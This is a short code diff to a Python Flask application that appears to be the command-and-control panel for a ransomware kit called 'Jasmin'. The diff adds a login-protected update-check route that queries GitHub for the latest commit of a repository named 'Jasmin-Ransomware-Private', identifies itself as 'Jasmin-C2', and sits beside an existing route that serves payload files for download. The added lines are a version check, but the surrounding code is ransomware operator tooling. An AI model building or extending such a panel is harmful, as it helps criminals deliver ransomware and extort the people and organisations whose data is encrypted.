@@ -191,6 +191,25 @@ def generate():
 def download_payload(filename):
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
+# ── Update Check ──
+CURRENT_VERSION = '1.0.0'
+
+@app.route('/update')
+@login_required
+def check_update():
+    import urllib.request
+    url = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1'
+    req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read())
+        sha = data[0]['sha'][:7]
+        date = data[0]['commit']['committer']['date']
+        msg = data[0]['commit']['message']
+        return jsonify(ok=True, current=CURRENT_VERSION, latest_commit=sha, date=date, message=msg, update=True)
+    except Exception:
+        return jsonify(ok=True, current=CURRENT_VERSION, latest=CURRENT_VERSION, update=False, msg='无法连接更新服务器')
+
 # ── Startup ──
 if __name__ == '__main__':
     if is_installed():
